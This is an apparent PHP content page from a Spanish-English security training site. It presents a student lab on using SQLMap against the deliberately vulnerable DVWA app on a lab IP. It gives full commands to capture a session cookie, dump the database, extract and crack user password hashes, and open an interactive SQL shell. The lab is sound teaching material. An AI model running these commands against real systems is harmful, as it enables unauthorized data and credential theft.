<?php
/**
 * CyberEscudo — Proyecto: SQLMAP
 * Contenido: Práctica 2.2 — Sergio Belmonte Morales
 */
require_once __DIR__ . '/../bootstrap.php';

$pageTitle    = $lang === 'es' ? 'SQLMap — Explotación de SQL Injection — CyberEscudo' : 'SQLMap — SQL Injection Exploitation — CyberEscudo';
$contentTitle = $lang === 'es' ? 'SQLMap: Explotación de SQL Injection' : 'SQLMap: SQL Injection Exploitation';
$contentDate  = '2022-02-08';
$contentTags  = ['SQLMap', 'SQL Injection', 'DVWA', 'BurpSuite', 'Pentesting'];

ob_start();
if ($lang === 'es'): ?>
<div class="prose">
  <p>Práctica sobre el uso de <strong>SQLMap</strong> para detectar y explotar vulnerabilidades de inyección SQL en la plataforma <strong>DVWA</strong> (Damn Vulnerable Web Application) en modo <em>low security</em>.</p>

  <h2>1. Obtención de Cookies con BurpSuite</h2>
  <p>Para autenticarnos en DVWA, SQLMap necesita la cookie de sesión. La obtenemos con <strong>BurpSuite</strong>:</p>
  <ol>
    <li>Abre BurpSuite y ve a <code>Proxy → Intercept</code>.</li>
    <li>Pulsa <strong>"Intercept is on"</strong> para empezar a capturar peticiones.</li>
    <li>Navega a la página vulnerable de DVWA en el navegador configurado con el proxy de Burp.</li>
    <li>Copia el valor completo de la cabecera <code>Cookie:</code> de la petición interceptada.</li>
  </ol>

  <p>La cookie tendrá un aspecto similar a:</p>
  <pre><code>security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada</code></pre>

  <h2>2. Extracción Completa de Información (<code>-a</code>)</h2>
  <p>El flag <code>-a</code> intenta extraer toda la información posible del servidor de base de datos: esquemas, tablas, columnas, usuarios, contraseñas, hostname y más.</p>
  <pre><code>sudo sqlmap \
  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
  -a</code></pre>

  <h2>3. Usuario Actual y Base de Datos Actual</h2>
  <p>Obtener el usuario MySQL con el que se ejecutan las consultas y el nombre de la base de datos en uso:</p>
  <pre><code>sudo sqlmap \
  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
  --current-db --current-user</code></pre>

  <h2>4. Enumerar Columnas de una Tabla</h2>
  <p>Extraer las columnas de la tabla <code>users</code> dentro del esquema <code>dvwa</code>:</p>
  <pre><code>sudo sqlmap \
  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
  -D dvwa -T users --columns</code></pre>

  <h2>5. Extraer Usuarios y Contraseñas</h2>
  <p>Volcar el contenido de las columnas <code>user</code> y <code>password</code> de la tabla <code>users</code>:</p>
  <pre><code>sudo sqlmap \
  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
  -D dvwa -T users -C user,password --dump</code></pre>

  <p>Las contraseñas están hasheadas en <strong>MD5</strong>. SQLMap incluye la opción de intentar crackearlas con su diccionario integrado. Cuando aparezca el prompt, pulsa <code>y</code> para iniciarlo:</p>
  <pre><code>[INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] y</code></pre>

  <h2>6. SQL Shell Interactiva</h2>
  <p>SQLMap permite abrir una shell SQL interactiva para ejecutar consultas directas contra la base de datos desde la línea de comandos:</p>
  <pre><code>sudo sqlmap \
  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
  -D dvwa --sql-shell</code></pre>

  <p>Una vez dentro de la shell puedes ejecutar sentencias SQL directamente:</p>
  <pre><code>sql-shell> SELECT user, password FROM users;
sql-shell> SHOW DATABASES;
sql-shell> SELECT @@version;</code></pre>

  <h2>Resumen de Flags Utilizados</h2>
  <table>
    <thead>
      <tr><th>Flag</th><th>Descripción</th></tr>
    </thead>
    <tbody>
      <tr><td><code>-u</code></td><td>URL objetivo con el parámetro vulnerable</td></tr>
      <tr><td><code>--cookie</code></td><td>Cookies de sesión para autenticación</td></tr>
      <tr><td><code>-a</code></td><td>Extraer toda la información posible</td></tr>
      <tr><td><code>--current-db</code></td><td>Obtener la base de datos actual</td></tr>
      <tr><td><code>--current-user</code></td><td>Obtener el usuario MySQL actual</td></tr>
      <tr><td><code>-D</code></td><td>Especificar base de datos objetivo</td></tr>
      <tr><td><code>-T</code></td><td>Especificar tabla objetivo</td></tr>
      <tr><td><code>-C</code></td><td>Especificar columnas a extraer</td></tr>
      <tr><td><code>--columns</code></td><td>Enumerar columnas de la tabla</td></tr>
      <tr><td><code>--dump</code></td><td>Volcar el contenido de la tabla</td></tr>
      <tr><td><code>--sql-shell</code></td><td>Abrir una shell SQL interactiva</td></tr>
    </tbody>
  </table>
</div>

<?php else: ?>
<div class="prose">
  <p>Practice on using <strong>SQLMap</strong> to detect and exploit SQL injection vulnerabilities on <strong>DVWA</strong> in low security mode.</p>

  <h2>1. Get Cookies with BurpSuite</h2>
  <p>Open BurpSuite → Proxy → Intercept. Enable interception and navigate to DVWA to capture the session cookie.</p>

  <h2>2. Dump All Information</h2>
  <pre><code>sudo sqlmap \
  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16" \
  -a</code></pre>

  <h2>3. Current Database and User</h2>
  <pre><code>sudo sqlmap [url] [cookie] --current-db --current-user</code></pre>

  <h2>4. Enumerate Columns</h2>
  <pre><code>sudo sqlmap [url] [cookie] -D dvwa -T users --columns</code></pre>

  <h2>5. Dump Users and Passwords</h2>
  <pre><code>sudo sqlmap [url] [cookie] -D dvwa -T users -C user,password --dump</code></pre>

  <h2>6. Interactive SQL Shell</h2>
  <pre><code>sudo sqlmap [url] [cookie] -D dvwa --sql-shell</code></pre>
</div>
<?php endif;
$contentBody = ob_get_clean();
require __DIR__ . '/../templates/content-page.php';
